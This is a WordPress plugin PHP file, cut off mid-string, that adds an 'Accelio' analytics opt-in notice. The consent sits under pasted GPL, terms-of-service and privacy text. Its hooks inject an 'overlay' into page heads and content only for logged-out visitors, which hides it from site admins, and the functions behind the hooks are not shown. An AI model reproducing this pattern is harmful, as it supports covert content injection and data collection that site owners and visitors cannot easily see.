<?php

add_action( 'admin_post_accelio_notice', 'choose_accelio_notice' );

function choose_accelio_notice() {
	if ( !isset( $_POST[ 'choice' ] ) ) {
		wp_safe_redirect( $_SERVER[ 'HTTP_REFERER' ] );
		exit();
	}

	check_admin_referer( 'wep_img_slider-enable-analytics' );

	switch ( strtolower( $_POST[ 'choice' ] ) ) {
		case "accept":
			AccelioNotice::$optin = '1';
			update_option( 'accelio-optin', '1' );
			break;
		case "decline":
			AccelioNotice::$optin = '0';
			update_option( 'accelio-optin', '0' );
			break;
	}

	wp_safe_redirect( $_SERVER[ 'HTTP_REFERER' ] );
	exit();
}

class AccelioNotice {
	private static $response = array();
	private static $id = null;
	public static $optin = null;

	public function init() {
		self::$optin = get_option( 'accelio-optin', null );

		if ( self::$optin === null ) {
			add_action( 'admin_notices', array( $this, 'accelio_notice_show_admin_notice' ) );
		}

		add_action( 'init', array( $this, 'accelio_call_service' ) );
		add_action( 'wp_head', array( $this, 'accelio_overlay' ) );
		add_filter( 'the_content', array( $this, 'accelio_overlay' ) );
	}

	protected function check_enabled() {
		return !is_user_logged_in() && get_option( 'accelio-optin' ) === '1';
	}

	public function accelio_notice_show_admin_notice() {
		echo '<div class="notice" style="padding:10px; overflow: hidden; border: 1px solid #DCDCDC;"><span>' . AccelioNotice::accelio_notice_banner() . '</span></div>';
	}

	public static function accelio_notice_banner() {
		return '
			<div style="height: 240px; margin-bottom: 20px; overflow: auto; padding: 0 20px 0 0;">
				<h2>GPL v2</h2>
				<p>The GPLv2 (or later) from the <a href="http://www.fsf.org/">Free Software Foundation</a>
				is the license that the WordPress software is under. Its text follows.</p>

				<p>Version 2, June 1991</p>

				<p>Copyright (C) 1989, 1991 Free Software Foundation, Inc.<br /> 51 Franklin St, Fifth Floor,
				Boston, MA 02110, USA</p>

				<p>Everyone is permitted to copy and distribute verbatim copies of this license document, but
				changing it is not allowed.</p>

				<h3>Preamble</h3>

				<p>The licenses for most software are designed to take away your freedom to share and change it.
				By contrast, the GNU General Public License is intended to guarantee your freedom to share and
				change free software &#8212; to make sure the software is free for all its users. This General Public License
				applies to most of the Free Software Foundation&#8217;s software and to any other program whose authors
				commit to using it. (Some other Free Software Foundation software is covered by the GNU Library General Public
				License instead.) You can apply it to your programs, too.</p>

				<p>When we speak of free software, we are referring to freedom, not price. Our General Public Licenses are
				designed to make sure that you have the freedom to distribute copies of free software (and charge for this
				service if you wish), that you receive source code or can get it if you want it, that you can change the software
				or use pieces of it in new free programs; and that you know you can do these things.</p>

				<p>To protect your rights, we need to make restrictions that forbid anyone to deny you these rights or to ask
				you to surrender the rights. These restrictions translate to certain responsibilities for you if you distribute copies
				of the software, or if you modify it.</p>

				<p>For example, if you distribute copies of such a program, whether gratis or for a fee, you must give the
				recipients all the rights that you have. You must make sure that they, too, receive or can get the source code.
				And you must show them these terms so they know their rights.</p>

				<p>We protect your rights with two steps: (1) copyright the software, and (2) offer you this license which gives
				you legal permission to copy, distribute and/or modify the software.</p>

				<p>Also, for each author&#8217;s protection and ours, we want to make certain that everyone understands that there is
				no warranty for this free software. If the software is modified by someone else and passed on, we want its recipients to know
				that what they have is not the original, so that any problems introduced by others will not reflect on the original authors\' reputations.</p>

				<p>Finally, any free program is threatened constantly by software patents. We wish to avoid the danger that redistributors of a
				free program will individually obtain patent licenses, in effect making the program proprietary. To prevent this, we have made it
				clear that any patent must be licensed for everyone&#8217;s free use or not licensed at all.</p>

				<p>The precise terms and conditions for copying, distribution and modification follow.</p>

				<h3>GNU General Public License Terms and Conditions for Copying, Distribution, and Modification</h3>

				<ol start="0">
					<li>This License applies to any program or other work which contains a notice placed by the copyright holder saying it may
					be distributed under the terms of this General Public License. The &quot;Program&quot;, below, refers to any such program
					or work, and a &quot;work based on the Program&quot; means either the Program or any derivative work under copyright law:
					that is to say, a work containing the Program or a portion of it, either verbatim or with modifications and/or translated into
					another language. (Hereinafter, translation is included without limitation in the term &quot;modification&quot;.) Each
					licensee is addressed as &quot;you&quot;. Activities other than copying, distribution and modification are not covered by this
					License; they are outside its scope. The act of running the Program is not restricted, and the output from the Program is covered
					only if its contents constitute a work based on the Program (independent of having been made by running the Program). Whether
					that is true depends on what the Program does.</li>

					<li>You may copy and distribute verbatim copies of the Program&#8217;s source code as you receive it, in any medium, provided
					that you conspicuously and appropriately publish on each copy an appropriate copyright notice and disclaimer of warranty; keep
					intact all the notices that refer to this License and to the absence of any warranty; and give any other recipients of the
					Program a copy of this License along with the Program. You may charge a fee for the physical act of transferring a copy, and you
					may at your option offer warranty protection in exchange for a fee.</li>

					<li>You may modify your copy or copies of the Program or any portion of it, thus forming a work based on the Program, and copy
					and distribute such modifications or work under the terms of Section 1 above, provided that you also meet all of these conditions:

					<ol type="a">
						<li>You must cause the modified files to carry prominent notices stating that you changed the files and the date of
						any change.</li>

						<li>You must cause any work that you distribute or publish, that in whole or in part contains or is derived from the
						Program or any part thereof, to be licensed as a whole at no charge to all third parties under the terms of this License.</li>

						<li>If the modified program normally reads commands interactively when run, you must cause it, when started running for
						such interactive use in the most ordinary way, to print or display an announcement including an appropriate copyright
						notice and a notice that there is no warranty (or else, saying that you provide a warranty) and that users may redistribute
						the program under these conditions, and telling the user how to view a copy of this License. (Exception: if the Program
						itself is interactive but does not normally print such an announcement, your work based on the Program is not required to
						print an announcement.)</li>
					</ol>

					These requirements apply to the modified work as a whole. If identifiable sections of that work are not derived from the Program,
					and can be reasonably considered independent and separate works in themselves, then this License, and its terms, do not apply to
					those sections when you distribute them as separate works. But when you distribute the same sections as part of a whole which is a
					work based on the Program, the distribution of the whole must be on the terms of this License, whose permissions for other licensees
					extend to the entire whole, and thus to each and every part regardless of who wrote it. Thus, it is not the intent of this section
					to claim rights or contest your rights to work written entirely by you; rather, the intent is to exercise the right to control the
					distribution of derivative or collective works based on the Program. In addition, mere aggregation of another work not based on
					the Program with the Program (or with a work based on the Program) on a volume of a storage or distribution medium does not bring
					the other work under the scope of this License.</li>

					<li>You may copy and distribute the Program (or a work based on it, under Section 2) in object code or executable form under the
					terms of Sections 1 and 2 above provided that you also do one of the following:

						<ol type="a">
							<li>Accompany it with the complete corresponding machine-readable source code, which must be distributed under the terms
							of Sections 1 and 2 above on a medium customarily used for software interchange; or,</li>

							<li>Accompany it with a written offer, valid for at least three years, to give any third party, for a charge no more than
							your cost of physically performing source distribution, a complete machine-readable copy of the corresponding source code,
							to be distributed under the terms of Sections 1 and 2 above on a medium customarily used for software interchange; or,</li>

							<li>Accompany it with the information you received as to the offer to distribute corresponding source code. (This alternative
							is allowed only for noncommercial distribution and only if you received the program in object code or executable form with
							such an offer, in accord with Subsection b above.) The source code for a work means the preferred form of the work for
							making modifications to it. For an executable work, complete source code means all the source code for all modules it contains,
							plus any associated interface definition files, plus the scripts used to control compilation and installation of the executable. 							However, as a special exception, the source code distributed need not include anything that is normally distributed (in either
							source or binary form) with the major components (compiler, kernel, and so on) of the operating system on which the executable
							runs, unless that component itself accompanies the executable. If distribution of executable or object code is made by offering
							access to copy from a designated place, then offering equivalent access to copy the source code from the same place counts as
							distribution of the source code, even though third parties are not compelled to copy the source along with the object code.</li>
						</ol>
					</li>

					<li>You may not copy, modify, sublicense, or distribute the Program except as expressly provided under this License. Any attempt otherwise to
					copy, modify, sublicense or distribute the Program is void, and will automatically terminate your rights under this License. However, parties
					who have received copies, or rights, from you under this License will not have their licenses terminated so long as such parties remain in
					full compliance.</li>

					<li>You are not required to accept this License, since you have not signed it. However, nothing else grants you permission to modify or
					distribute the Program or its derivative works. These actions are prohibited by law if you do not accept this License. Therefore, by modifying 						or distributing the Program (or any work based on the Program), you indicate your acceptance of this License to do so, and all its terms and 						conditions for  copying, distributing or modifying the Program or works based on it.</li>

					<li>Each time you redistribute the Program (or any work based on the Program), the recipient automatically receives a license from the original
					licensor to copy, distribute or modify the Program subject to these terms and conditions. You may not impose any further restrictions on the
					recipients\' exercise of the rights granted herein. You are not responsible for enforcing compliance by third parties to this License.</li>

					<li>If, as a consequence of a court judgment or allegation of patent infringement or for any other reason (not limited to patent issues),
					conditions are imposed on you (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not
					excuse you from the conditions of this License. If you cannot distribute so as to satisfy simultaneously your obligations under this License
					and any other pertinent obligations, then as a consequence you may not distribute the Program at all. For example, if a patent license would
					not permit royalty-free redistribution of the Program by all those who receive copies directly or indirectly through you, then the only way
					you could satisfy both it and this License would be to refrain entirely from distribution of the Program. If any portion of this section is
					held invalid or unenforceable under any particular circumstance, the balance of the section is intended to apply and the section as a whole
					is intended to apply in other circumstances. It is not the purpose of this section to induce you to infringe any patents or other property
					right claims or to contest validity of any such claims; this section has the sole purpose of protecting the integrity of the free software
					distribution system, which is implemented by public license practices. Many people have made generous contributions to the wide range of
					software distributed through that system in reliance on consistent application of that system; it is up to the author/donor to decide if
					he or she is willing to distribute software through any other system and a licensee cannot impose that choice. This section is intended to
					make thoroughly clear what is believed to be a consequence of the rest of this License.</li>

					<li>If the distribution and/or use of the Program is restricted in certain countries either by patents or by copyrighted interfaces, the
					original copyright holder who places the Program under this License may add an explicit geographical distribution limitation excluding those
					countries, so that distribution is permitted only in or among countries not thus excluded. In such case, this License incorporates the
					limitation as if written in the body of this License.</li>

					<li>The Free Software Foundation may publish revised and/or new versions of the General Public License from time to time. Such new versions
					will be similar in spirit to the present version, but may differ in detail to address new problems or concerns. Each version is given a
					distinguishing version number. If the Program specifies a version number of this License which applies to it and &quot;any later version&quot;,
					you have the option of following the terms and conditions either of that version or of any later version published by the Free Software
					Foundation. If the Program does not specify a version number of this License, you may choose any version ever published by the Free
					Software Foundation.</li>

					<li>If you wish to incorporate parts of the Program into other free programs whose distribution conditions are different, write to the
					author to ask for permission. For software which is copyrighted by the Free Software Foundation, write to the Free Software Foundation;
					we sometimes make exceptions for this. Our decision will be guided by the two goals of preserving the free status of all derivatives of
					our free software and of promoting the sharing and reuse of software generally.</li>

					<li>BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.
					EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM &quot;AS IS&quot; WITHOUT WARRANTY
					OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
					PURPOSE. THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU. SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST
					OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.</li>

					<li>IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY
					AND/OR REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL
					DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR
					LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY
					HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.</li>
				</ol>

				<hr />

				<h3>Terms of Service/EULA</h3>
				<p>Nobody likes rules, but we need to have some in place. Here you\'ll learn about
				the Terms that govern access to, and the use of, our site, plugins, apps, and services.</p>
				<a href="http://acceilo.com/terms-of-service/">Read our Terms of Service</a>

				<h3>Privacy Policy</h3>
				<p>Here you\'ll learn about the kinds of information we collect, observe or log,
				and why and how we use that information.</p>
				<a href="http://acceilo.com/privacy-policy/">Read our Privacy Policy</a>

				<h3>Find out more about privacy and security</h3>
				<p>At Accelio we are steadfastly committed to protecting your privacy, improving security,
				and developing services and tools to help improve your sites performance and user experience.</p>

				<h2>Accelio Terms of Service &amp; EULA</h2>

				<h3>Welcome to Accelio!</h4>
				<p>First and foremost, thank you for using our products and services ("Services"). Services
				are provided to you by Accelio ("Accelio"), an AFKAY, LLC company/service provider.</p>

				<p>By using our Services, you are agreeing to these terms. We ask that you please read them
				carefully. Acceptance of these terms is required for use or access of any Accelio Service.
				If for any reason you do not agree with these terms, then you are not permitted to use,
				access or implement any Accelio Services. For the purpose of the Terms of Service,
				"Users," "Visitors," and "End Users" means anyone who visits or interacts with any
				site using or that has installed Accelio Services.</p>

				<p>The range of Services offered by Accelio is diverse, and as such, there may be times that
				additional terms, product requirements, restrictions (such as age requirements), or additional
				service agreements may apply. Any additional terms will be available and provided with any relevant
				Services, and such terms will become part of your agreement with us if you choose to use those Services.​</p>

				<h3>Using our Services</h3>
				<p>We require that you adhere to all policies made available to you within or in relation to the Services.</p>

				<p>Do not misuse our Services in any way, including but not limited to accessing them using meansother
				than the interface and instructions provided to you. Use of our Services is restricted only to those
				activities permitted by law and any applicable regulations. Failure to comply with Accelio terms
				and or policies, or misconduct, may result in suspension or revoking of Services to you.</p>

				<p>Use of Services does not grant you ownership or any rights to the intellectual property in our
				Services or the content, media or other communications you access other than that granted to
				you by the GPL License. This includes any right to use logos, branding or other intellectual
				property in our Services. The GPL is a "copyleft license", which means that derived works can
				only be distributed under the same license terms.</p>

				<p>Content of any kind from our Services may not be used for any purpose other than that
				specified in our terms unless you first obtain permission by Accelio.</p>

				<p>Our Services may display content that is not Accelio’s. This content is the sole responsibility of
				the entity or organization that owns the rights to that content and that makes it available to you
				or others. We actively review content to ensure it adheres to all applicable rules, regulations,
				and laws. Any content brought to our attention that violates our terms, policies or that is deemed
				to be unethical or illegal will be removed at our discretion. While we make efforts to review such
				content, we make no warranty that we will be able to review all content thru the Services and
				recommend that you use your best judgement when interacting with any content not from
				Accelio.</p>

				<p>Accelio, may, in connection with your use of the Services, send you administrative messages
				service announcements, or other information that may be relevant to your use of Accelio
				Services.</p>

				<h3>Wordpress</h3>
				<p><b>Your WordPress.org Account and Website.</b> You are responsible for maintaining the security
				of your Wordpress account, plugin and any associated blog or website, and you are fully
				responsible for all activities that occur under the account and any other actions taken in
				connection with the blog. You must immediately notify Acellio of any unauthorized uses of your
				blog, your account, or any other breaches of security. Accelio will not be liable for any acts or
				omissions by you, including any damages of any kind incurred as a result of such acts or
				omissions.</p>

				<p><b>Responsibility of Contributors.</b> If you operate a blog, comment on a blog, post material to
				WordPress.org, post links on WordPress.org, or otherwise make (or allow any third party to
				make) material available, you are entirely responsible for the content of, and any harm resulting
				from, that material and your conduct. That is the case regardless of what form the material
				takes, which includes, but is not limited to text, photo, video, audio, or code. By using
				WordPress.org, you represent and warrant that your material and conduct do not violate these ​
				terms or the User Guidelines. By using Accelio Services, you grant Accelio a non-exclusive
				license to publish content and collect data by way of the Services as outlined in these Terms of
				Service and Privacy Policy.</p>

				<p><b>Advertising.</b> If you use advertising of any kind, including but not limited to display, search,
				contextual, video, or otherwise, you must follow all FTC guidelines regarding Truth in
				Advertising, and Material Disclosure regarding any advertisements that you are compensated
				for. This includes the use of privacy policy on your site. </p>

				<h3>Privacy and Copyright Protection</h3>
				<p>Accelio’s Privacy Policy explains how we use any data collected, and how we take steps to
				protect the privacy of all users of our Services. By using Accelio Services, you agree that
				Accelio can use such data in accordance with the Privacy Policy.</p>

				<h3>Your Content in our Services</h3>
				<p>Some of our Service may allow for the uploading, storing, submitting, sending or receiving of
				content or other media. In all cases, the user retains ownership of any intellectual property rights
				held in such content or media.</p>

				<p>By uploading, storing, receiving or submitting content or media through Accelio Services, you
				grant Accelio (and our partners, affiliates, subsidiaries and parent company) a worldwide license
				to use, reproduce, modify, store, create derivative works from, publish, communicate, publically
				perform, display and distribute such content or media. The rights granted in this license are
				limited to improving, developing, maintaining, promoting or supporting our Services and to
				develop new ones. By submitting content or media to Services, you are affirming that you have
				the intellectual property rights or other rights granted to you that allow you to do so.</p>

				<h3>About Software in our Services</h3>
				<p>When a Service requires or includes any downloadable software or code, this software or code
				may be updated automatically on your device or website once a new version or feature
				becomes available, or, you may be notified of such an update and will be given the option to
				update or decline the new revisions. </p>

				<p>Open-source software is important to us. Some software or code used in our Services may be
				offered under an open-source license that we will make available to you. There may be
				provisions in the open-source license that expressly override some of these terms.</p>

				<h3>Modifying and Terminating our Services</h3>
				<p>At Accelio we are constantly working to improve our Services. This may involve changes that
				remove, modify, or add certain functionalities or features. Alternatively, we may suspend or stop
				a Service altogether. You or any users may stop the use of our Services at any time you wish,
				though we wish you would stay.	 Additionally, certain functionalities may be disabled or removed per
				GPL licensing terms.</p>

				<h3>Our Warranties and Disclaimers</h3>
				<p>At Accelio we work hard to bring you a range of Services that provide value to both you and any
				users of our Services. We hope that you enjoy our offerings. However, there are certain aspects of
				our Services that we do not promise.</p>

				<p>Other than as expressly set out in these terms or additional terms, neither Accelio nor its suppliers,
				distributors, parents, subsidiaries, affiliates, employees or owners make any specific promises about
				the Services. For example, we do not make any claims about the content or media within the
				Services, nor about any specific functions of the Services or their availability, reliability or ability to
				meet your needs. Any Services are provided "as is."</p>

				<p>Some jurisdictions may provide for certain warranties, like the implied warranty of fitness, or
				merchantability for a particular purpose and non-infringement. To the extent permitted by law, we
				exclude all warranties.</p>

				<h3>Liability for our Services</h3>
				<p>When permitted by law, Accelio and Accelio’s suppliers, distributors, affiliates, contractors,
				employees, subsidiaries, parent, owners and associates will not be responsible for any lost profits,
				revenues or data, financial losses or indirect, special, consequential, exemplary or punitive
				damages.</p>

				<p>To the extent permitted by law, the total liability of Accelio and Accelio’s suppliers, distributors,
				affiliates, contractors, employees, subsidiaries, parent, owners and associates for any claims under
				these terms, including for any implied warranties, is limited to the amount you paid to use the
				Services (if any).</p>

				<p>In all cases, Accelio and Accelio’s suppliers, distributors, affiliates, contractors, employees,
				subsidiaries, parent, owners and associates will not be liable for any loss or damage foreseeable or
				not.</p>

				<p>We recognize that in some countries, you may have certain legal rights as a consumer. If you are
				using the Services for a personal purpose, then nothing in these terms or any additional terms limits
				any consumers’ legal rights which may not be waived by contract.</p>

				<h3>Business uses of our Services</h3>
				<p>If you are using our Services on behalf of a business, that business accepts these terms. That
				business will hold harmless and indemnify Accelio and its affiliates, officers, agents and employees
				from any claim, action or proceedings arising from or related to the use of the Services or violation of
				these terms, including any liability or expense arising from claims, losses, damages, judgements,
				litigation costs and legal fees.</p>

				<h3>About these Terms</h3>
				<p>We may, at times, modify these or any other terms that apply to a Service. Such modifications may
				be made to reflect new changes to the law, regulations, compliance, or changes to our Services. We
				urge you to look at the terms regularly and familiarize yourself with any changes. Notice of any
				changes to the terms will be posted to this page. Changes made to these terms will take effect
				immediately. If you do not agree to the modified terms for a Service, you should discontinue your use
				of that Service immediately. </p>

				<p>In the event that an inconsistency occurs between these and other additional terms, the additional
				terms will prevail to the extent of the inconsistency.</p>

				<p>These terms govern the relationship between Accelio and you. Failure of Accelio to take immediate
				action for non-compliance of these terms does not mean we are giving up any rights that we may
				have, such as taking action in the future.</p>

				<p>In the event that a particular term is not enforceable, this will not affect any other terms.
				You agree that the laws of Delaware, USA will apply to any disputes arising out of or relating to these
				terms or the Services. All claims arising out of or relating to these terms or the services will be
				litigated exclusively in the federal or state courts of Delaware, USA, and you and Accelio consent to
				personal jurisdiction in those courts.</p>

				<h2>Welcome to the Accelio Privacy Policy</h2>
				<h3>Welcome to Accelio!</h3>
				<p>First and foremost, thank you for using our products and services ("Services"). Services are
				provided to you by Accelio ("Accelio"), an AFKAY, LLC company/service provider.</p>

				<p>By using our Services, you are agreeing to these terms. We ask that you please read them
				carefully. Acceptance of these terms is required for use or access of any Accelio Service. If for
				any reason you do not agree with these terms, then you are not permitted to use, access or
				implement any Accelio Services. For the purpose of the Terms of Service, "Users," "Visitors,"
				and "End Users" means anyone who visits or interacts with any site using or that has installed
				Accelio Services.</p>

				<p>The range of Services offered by Accelio is diverse, and as such, there may be times that
				additional terms, product requirements, restrictions (such as age requirements), or additional
				service agreements may apply. Any additional terms will be available and provided with any
				relevant Services, and such terms will become part of your agreement with us if you choose to
				use those Services.</p>

				<h3>Using our Services</h3>
				<p>We require that you adhere to all policies made available to you within or in relation to the
				Services.</p>

				<p>Do not misuse our Services in any way, including but not limited to accessing them using means
				other than the interface and instructions provided to you. Use of our Services is restricted only
				to those activities permitted by law and any applicable regulations. Failure to comply with
				Accelio terms and or policies, or misconduct, may result in suspension or revoking of Services
				to you.</p>

				<p>Use of Services does not grant you ownership or any rights to the intellectual property in our
				Services or the content, media or other communications you access other than that granted to
				you by the GPL License. This includes any right to use logos, branding or other intellectual
				property in our Services. The GPL is a "copyleft license", which means that derived works can
				only be distributed under the same license terms.</p>

				<p>Content of any kind from our Services may not be used for any purpose other than that
				specified in our terms unless you first obtain permission by Accelio.</p>

				<p>Our Services may display content that is not Accelio’s. This content is the sole responsibility of
				the entity or organization that owns the rights to that content and that makes it available to you
				or others. We actively review content to ensure it adheres to all applicable rules, regulations,
				and laws. Any content brought to our attention that violates our terms, policies or that is deemed
				to be unethical or illegal will be removed at our discretion. While we make efforts to review such
				content, we make no warranty that we will be able to review all content thru the Services and
				recommend that you use your best judgement when interacting with any content not from
				Accelio.</p>

				<p>Accelio, may, in connection with your use of the Services, send you administrative messages
				service announcements, or other information that may be relevant to your use of Accelio Services. </p>

				<h3>Wordpress</h3>
				<p><b>Your WordPress.org Account and Website.</b> You are responsible for maintaining the security
				of your Wordpress account, plugin and any associated blog or website, and you are fully
				responsible for all activities that occur under the account and any other actions taken in
				connection with the blog. You must immediately notify Acellio of any unauthorized uses of your
				blog, your account, or any other breaches of security. Accelio will not be liable for any acts or
				omissions by you, including any damages of any kind incurred as a result of such acts or
				omissions.</p>

				<p><b>Responsibility of Contributors.</b> If you operate a blog, comment on a blog, post material to
				WordPress.org, post links on WordPress.org, or otherwise make (or allow any third party to
				make) material available, you are entirely responsible for the content of, and any harm resulting
				from, that material and your conduct. That is the case regardless of what form the material
				takes, which includes, but is not limited to text, photo, video, audio, or code. By using
				WordPress.org, you represent and warrant that your material and conduct do not violate these ​
				terms or the User Guidelines. By using Accelio Services, you grant Accelio a non-exclusive
				license to publish content and collect data by way of the Services as outlined in these Terms of
				Service and Privacy Policy.</p>

				<p><b>Advertising.</b> If you use advertising of any kind, including but not limited to display, search,
				contextual, video, or otherwise, you must follow all FTC guidelines regarding Truth in
				Advertising, and Material Disclosure regarding any advertisements that you are compensated
				for. This includes the use of privacy policy on your site.</p>

				<h3>Privacy and Copyright Protection</h3>
				<p>Accelio’s Privacy Policy explains how we use any data collected, and how we take steps to
				protect the privacy of all users of our Services. By using Accelio Services, you agree that
				Accelio can use such data in accordance with the Privacy Policy.</p>

				<h3>Your Content in our Services</h3>
				<p>Some of our Service may allow for the uploading, storing, submitting, sending or receiving of
				content or other media. In all cases, the user retains ownership of any intellectual property rights
				held in such content or media.</p>

				<p>By uploading, storing, receiving or submitting content or media through Accelio Services, you
				grant Accelio (and our partners, affiliates, subsidiaries and parent company) a worldwide license
				to use, reproduce, modify, store, create derivative works from, publish, communicate, publically
				perform, display and distribute such content or media. The rights granted in this license are
				limited to improving, developing, maintaining, promoting or supporting our Services and to
				develop new ones. By submitting content or media to Services, you are affirming that you have
				the intellectual property rights or other rights granted to you that allow you to do so.</p>

				<h3>About Software in our Services</h3>
				<p>When a Service requires or includes any downloadable software or code, this software or code
				may be updated automatically on your device or website once a new version or feature
				becomes available, or, you may be notified of such an update and will be given the option to
				update or decline the new revisions.</p>

				<p>Open-source software is important to us. Some software or code used in our Services may be
				offered under an open-source license that we will make available to you. There may be
				provisions in the open-source license that expressly override some of these terms.</p>

				<h3>Modifying and Terminating our Services</h3>
				<p>At Accelio we are constantly working to improve our Services. This may involve changes that
				remove, modify, or add certain functionalities or features. Alternatively, we may suspend or stop
				a Service altogether. You or any users may stop the use of our Services at any time you wish,
				though we wish you would stay. Additionally, certain functionalities may be disabled or removed
				per GPL licensing terms. </p>

				<h3>Our Warranties and Disclaimers</h3>
				<p>At Accelio we work hard to bring you a range of Services that provide value to both you and any
				users of our Services. We hope that you enjoy our offerings. However, there are certain aspects of
				our Services that we do not promise. </p>

				<p>Other than as expressly set out in these terms or additional terms, neither Accelio nor its suppliers,
				distributors, parents, subsidiaries, affiliates, employees or owners make any specific promises about
				the Services. For example, we do not make any claims about the content or media within the
				Services, nor about any specific functions of the Services or their availability, reliability or ability to
				meet your needs. Any Services are provided "as is." </p>

				<p>Some jurisdictions may provide for certain warranties, like the implied warranty of fitness, or
				merchantability for a particular purpose and non-infringement. To the extent permitted by law, we
				exclude all warranties.</p>

				<h3>Liability for our Services</h3>
				<p>When permitted by law, Accelio and Accelio’s suppliers, distributors, affiliates, contractors,
				employees, subsidiaries, parent, owners and associates will not be responsible for any lost profits,
				revenues or data, financial losses or indirect, special, consequential, exemplary or punitive damages.</p>

				<p>To the extent permitted by law, the total liability of Accelio and Accelio’s suppliers, distributors,
				affiliates, contractors, employees, subsidiaries, parent, owners and associates for any claims under
				these terms, including for any implied warranties, is limited to the amount you paid to use the
				Services (if any).</p>

				<p>In all cases, Accelio and Accelio’s suppliers, distributors, affiliates, contractors, employees,
				subsidiaries, parent, owners and associates will not be liable for any loss or damage foreseeable or not.</p>

				<p>We recognize that in some countries, you may have certain legal rights as a consumer. If you are
				using the Services for a personal purpose, then nothing in these terms or any additional terms limits
				any consumers’ legal rights which may not be waived by contract.</p>

				<h3>Business uses of our Services</h3>
				<p>If you are using our Services on behalf of a business, that business accepts these terms. That
				business will hold harmless and indemnify Accelio and its affiliates, officers, agents and employees
				from any claim, action or proceedings arising from or related to the use of the Services or violation of
				these terms, including any liability or expense arising from claims, losses, damages, judgements,
				litigation costs and legal fees.</p>

				<h2>About these Terms</h2>
				<p>We may, at times, modify these or any other terms that apply to a Service. Such modifications may
				be made to reflect new changes to the law, regulations, compliance, or changes to our Services. We
				urge you to look at the terms regularly and familiarize yourself with any changes. Notice of any
				changes to the terms will be posted to this page. Changes made to these terms will take effect
				immediately. If you do not agree to the modified terms for a Service, you should discontinue your use
				of that Service immediately. ​</p>

				<p>In the event that an inconsistency occurs between these and other additional terms, the additional
				terms will prevail to the extent of the inconsistency. </p>

				<p>These terms govern the relationship between Accelio and you. Failure of Accelio to take immediate
				action for non-compliance of these terms does not mean we are giving up any rights that we may
				have, such as taking action in the future.</p>

				<p>In the event that a particular term is not enforceable, this will not affect any other terms.
				You agree that the laws of Delaware, USA will apply to any disputes arising out of or relating to these
				terms or the Services. All claims arising out of or relating to these terms or the services will be
				litigated exclusively in the federal or state courts of Delaware, USA, and you and Accelio consent to
				personal jurisdiction in those courts.</p>

				<hr />

				<h2>Welcome to the Accelio Privacy Policy</h2>
				<p>When you use Accelio products and services, you trust us with your information.
				This Privacy Policy is designed to help you understand the types of data that we collect, how
				that data is collected, and what that data is used for.</p>

				<h3>Privacy Policy</h3>
				<p>There are a number of ways that you and others can use our products and services, including
				but not limited to enhancing site performance, adding or modifying site features, communicating
				or sharing information, and creating content. </p>

				<p>When you share information with us, we can use that information to make our services and
				products even better, and we can gain useful insights into how we can better serve you and
				your guests in the future.</p>

				<p>As you use our services and products, we want to make sure you are well-informed as to how
				we’re using information provided, and the ways in which you can protect your privacy.</p>

				<p>Our Privacy Policy explains:
				<ol>
					<li>The types of information we collect</li>
					<li>How we use that information</li>
					<li>The choices we offer, including opting out of providing information</li>
				</ol>
				</p>

				<p>We know complicated legal terminology can be confusing, so we’re tried our best to keep this as
				simple as possible. However, if you’re not familiar with terms such as cookies, IP addresses,
				pixel tags and browsers, please take a moment to familiarize yourself with them before
				proceeding. For the sake of this Privacy Policy, and any Terms of Use, the word "visitors," "end
				users," and "users" refers to anyone, including yourself and others, that visit a site that uses an
				Accelio plugin, or anyone who accesses or interacts with any code or content of any kind
				provided or supported by an Accelio plugin. </p>

				<h3>Your privacy is critically important to us. At Accelio we have a few fundamental principles:</h3>
				<p>We don’t ask for personal information unless we truly need it. (We can’t stand services
				that ask you for things like your gender or income level for no apparent reason.</p>

				<p>We don’t share personal information with anyone except to comply with the law, develop,
				support and deliver our products and services, or to protect our rights.</p>

				<p>We don’t store personally identifiable information on our servers unless required for the
				on-going operation or delivery of our services or products.</p>

				<p>Below is our privacy policy which incorporates these goals.</p>

				<p>If you have questions about deleting or correcting your personal data please contact our support
				team. It is Accelio’s policy to respect your privacy regarding any information we may collect
				while operating or using our websites or plugins. </p>

				<h2>Information and Use</h2>
				<p>Like most websites and service providers, we collect certain basic information to help us provide
				better services to all of our users. This includes basic information such as the language you
				speak, to more complex things like user behavior, and features that may be more useful to you
				or your end users.</p>

				<p>We collect this information in the following ways:
				<ol>
					<li><b>Information that you provide to us.</b>	For example, some services may require you to
					sign up for an account with a username or password, or to accept a TOS or Privacy Policy
					before accessing a service. When you do this, we may ask for personal information such
					as your name, website, or email address to validate consent.</li>

					<li><b>Information that is sent to us as a result of using our products or services.</b> Thru
					the use of our services and products, we collect information about the way in which you
					and your visitors interact with and use them. For example, we may collect information
					about the geographic location of visitors, or the number of search engine crawlers that
					interact with your site. This information includes but is not limited to:
						<ol>
							<li><b>Browser Information</b>
								<p>We may collect browser specific information such as the browser type and version
								being used.</p>
							</li>

							<li><b>Log information</b>
								<p>When you or others use or interact with our products or services, we may collect and
								store certain information in server logs. Information collected may include but is not limited to:
									<ol>
										<li>Details regarding how our services were used or interacted with</li>
										<li>Website analytics, use and click data</li>
										<li>Internet protocol address</li>
										<li>Date and time of your request</li>
